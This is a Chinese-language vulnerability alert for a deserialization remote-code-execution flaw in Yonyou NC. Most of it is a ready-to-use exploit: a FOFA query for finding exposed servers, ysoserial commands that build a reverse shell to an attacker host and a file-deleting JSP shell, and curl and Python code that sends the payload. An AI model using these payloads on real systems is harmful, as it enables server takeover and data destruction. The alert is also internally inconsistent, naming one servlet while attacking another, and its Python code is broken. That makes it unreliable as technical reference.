---
title: 【漏洞预警】用友NC UserSynchronizationServlet 反序列化RCE漏洞
---

## 漏洞概述
用友NC UserSynchronizationServlet 存在反序列化漏洞，攻击者可构造恶意序列化对象执行任意命令，控制服务器。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | 用友NC UserSynchronizationServlet 反序列化代码执行漏洞 |
| 漏洞类型 | 反序列化RCE |
| 影响组件 | 用友NC |
| 严重程度 | 严重 |

## FOFA查询
```
app="用友-UFIDA-NC"
```

## POC
```bash
# 使用ysoserial生成payload (需要Java环境和ysoserial工具)
# 下载ysoserial: https://github.com/frohoff/ysoserial/releases

# 生成反弹shell payload
java -jar ysoserial.jar CommonsCollections6 "bash -i >& /dev/tcp/attacker/port 0>&1" > payload.ser

# 生成写入webshell payload
java -jar ysoserial.jar CommonsCollections6 "echo '<%@page import=\"java.io.*\"%><%new File(request.getParameter(\"f\")).delete();%>' > /tmp/shell.jsp" > payload.ser

# 发送payload
curl -X POST "http://target/servlet/oAUserAuthenticationServlet?pageId=login" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser
```

Python脚本:
```python
import requests
import subprocess

# 生成payload
def generate_payload(cmd):
    subprocess.run([
        "java", "-jar", "ysoserial.jar",
        "CommonsCollections6", cmd,
        ">", "payload.ser"
    ], shell=True)
    with open("payload.ser", "rb") as f:
        return f.read()

# 发送payload
target = "http://target/servlet/oAUserAuthenticationServlet?pageId=login"
headers = {"Content-Type": "application/x-java-serialized-object"}
payload = generate_payload("whoami")
r = requests.post(target, headers=headers, data=payload)
print(r.status_code, r.text)
```

## 修复建议
1. 联系厂商升级版本
2. 部署Web应用防火墙
3. 关闭互联网暴露面